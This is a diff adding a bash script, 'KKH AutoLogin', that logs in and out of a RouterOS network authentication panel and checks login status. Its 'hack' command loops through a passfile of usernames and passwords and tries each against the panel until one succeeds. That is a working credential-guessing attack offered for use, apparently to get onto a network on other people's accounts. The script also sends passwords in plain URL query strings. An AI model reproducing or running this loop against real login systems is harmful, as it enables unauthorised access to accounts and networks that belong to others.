@@ -1,0 +1,144 @@
+#!/bin/bash
+# Created by Lokesh Devnani (@lokeshdevnani)
+no=$#;
+YELLOW='\033[0;33m'
+GREEN='\033[0;32m'
+CYAN='\e[36m'
+RED='\033[1;31m'
+BLUE='\033[0;34m'
+NC='\033[0m' # No Color
+HCOLOR='\e[96m'
+SILENT=""
+
+function showoptions(){
+    COLUMNS=50
+    printf '\e[1;34m%0.1s\e[m' "''"{1..60}
+    title="KKH AutoLogin"
+    printf "\n%*s\n" $(((${#title}+$COLUMNS)/2)) "$title"
+    printf '\e[1;34m%0.1s\e[m' "-"{1..60}
+    echo;
+    echo -e "KKH autologin is an open source CLI tool to automatically\nlogin to the network RouterOS authentication panel.";
+    echo -e "This script automatically tries out all the passwords\nspecified into the passfile (which can be edited) until\nlogin succeeds."
+    printf '\e[1;34m%0.1s\e[m' "-"{1..60}
+    echo;
+    echo -e "$HCOLOR Check status  :$NC  kkh status";
+    echo -e "$HCOLOR Log in        :$NC  kkh login [username [password]]";
+    echo -e "$HCOLOR Log out       :$NC  kkh logout";
+    echo -e "$HCOLOR Autologin all :$NC  kkh hack [file]";
+    printf '\e[1;34m%0.1s\e[m' "-"{1..60}
+    echo;
+    echo -e "$HCOLOR 1. Checking status:$NC";
+    echo "   kkh status";
+    echo -e "$HCOLOR 2. Login:$NC";
+    echo -e "$HCOLOR   a) $NC kkh login";
+    echo -e "$HCOLOR   b) $NC kkh login john";
+    echo -e "$HCOLOR   c) $NC kkh login john johnpassword";
+    echo -e "$HCOLOR 3. Logout:$NC";
+    echo "   kkh logout";
+    echo -e "$HCOLOR 4. Autologin all [Try every username password in\n    passfile until login is Successful]:$NC";
+    echo -e "$HCOLOR   a) $NC kkh hack";
+    echo -e "$HCOLOR   b) $NC kkh hack passfile";
+    printf '\e[1;34m%0.1s\e[m' "-"{1..60};
+    echo;
+    echo "Made with love by Lokesh Devnani"
+    echo "Feel free to fork and report issues at:"
+    echo -e "\e[94m   http://www.github.com/lokeshthegenius/kkh${NC}"
+    echo -e "\e[94m          contact@lokeshd.com${NC}"
+    printf '\e[1;34m%0.1s\e[m' "''"{1..60}
+    echo;
+}
+
+function kkh_status(){
+  curl -s "192.168.10.1/login" | grep "logged" > /dev/null
+  if [ $? -eq 0 ] ; then
+    echo -e "${CYAN}Already logged in ${NC}";
+    return 0;
+  else
+    echo -e "${CYAN}Not logged in ${NC}";
+  fi
+  return 1;
+}
+
+function kkh_login(){
+    output=`curl -s "192.168.10.1/login?username=$1&password=$2"`;
+    echo "$output" | grep "logged" > /dev/null
+    if [ $? -eq 0 ] ; then
+      echo -e "${GREEN}Successful${NC}"
+      return 0;
+    else
+      echo "$output" | grep 'no more sessions' > /dev/null
+      if [ $? -eq 0 ] ; then
+        echo -e "${RED}Failed${NC}: ${YELLOW}No more sessions allowed${NC}"
+      else
+        echo -e "${RED}Failed${NC}: ${YELLOW}Invalid credentials${NC}"
+      fi
+    fi
+    return 1;
+}
+
+function kkh_logout(){
+  curl -s "192.168.10.1/logout" > /dev/null
+  echo -e "${CYAN}Logged out successfully${NC}";
+  return 0;
+}
+
+function kkh_hack(){
+  if [ -n "$1" ]; then
+    file=$1
+  else
+    file="/usr/local/bin/passfile"
+  fi
+  while IFS=' ' read -r username password; do
+    curl -s "192.168.10.1/login?username=$username&password=$password" | grep "logged" > /dev/null
+    if [ $? -eq 0 ] ; then
+      echo -e "${GREEN}Successful: $username ${NC}"
+      break;
+    else
+      echo -e "${RED}Failed: $username${NC}"
+    fi
+  done < "$file"
+}
+
+if [ $no -le 0 ]; then
+  echo "Please enter any option";
+  showoptions
+  exit
+fi
+
+
+if [ "$1" = "status" ]; then
+  kkh_status
+elif [ "$1" = "login" ]; then
+  kkh_status
+  if [ $? -eq 0 ] ; then
+    exit;
+  fi
+  if [ $no -ge 3 ]; then
+    user=$2;
+    pass=$3;
+  elif [ $no -ge 2 ]; then
+    echo -ne "${BLUE}Enter Password${NC} : "
+    read -s pass
+    user=$2;
+    echo;
+  else
+    echo -ne "${BLUE}Username${NC} : "
+    read -s user
+    echo;
+    echo -ne "${BLUE}Password${NC} : "
+    read -s pass;
+    echo
+  fi
+  echo -ne "  logging in ...\r";
+  kkh_login $user $pass
+elif [ "$1" = "logout" ]; then
+  kkh_logout
+elif [ "$1" = "hack" ]; then
+  kkh_status
+  if [ $? -eq 0 ] ; then
+    exit;
+  fi
+  kkh_hack $2
+else
+  showoptions
+fi
